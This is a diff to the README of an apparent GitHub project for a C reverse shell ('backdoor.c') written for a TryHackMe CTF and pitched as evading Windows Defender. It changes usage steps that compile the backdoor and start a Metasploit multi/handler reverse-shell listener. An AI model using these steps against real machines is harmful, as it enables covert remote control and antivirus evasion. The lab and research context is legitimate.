@@ -7,6 +7,9 @@ A minimal Windows reverse shell implementation in pure C. This repository demons
 I was doing a CTF on tryhackme which required a 64 bit binary and didn't want to use nim to bypass defender. Was wondering how hard it would be to set one up. Nims default detections are: 36/73 - however notably it can still bypass defender. 
 - https://github.com/Sn1r/Nim-Reverse-Shell/tree/main
 
+<p align="center">
+  <img src="https://github.com/pentestfunctions/metasploit_c_custom/blob/main/images/Metasploit_Connection.gif">
+</p>
 
 ## Overview
 
@@ -84,8 +87,8 @@ Detection rates by compiler/flags:
 ## Usage
 
 1. Replace `YOUR_IP_HERE` with your actual IP address
-2. Compile using `gcc -O2 backdoor.c -o backdoor_tdm.exe -mwindows` on a windows machine
-3. Set up a metasploit listener on your machine: `msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set Payload windows/meterpreter/reverse_tcp; run -j"`
+2. Compile using `gcc -O2 backdoor.c -o github_gcc_test.exe` on a windows machine
+3. Set up a metasploit listener on your machine: `msfconsole -q -x "use exploit/multi/handler; set LHOST eth0; set LPORT 4444; set Payload generic/shell_reverse_tcp; run -j"`
 4. Run the executable on the target Windows machine
 
 NOTES: Change tun0 to eth0 or whatever you need for your VM environment or local network. 
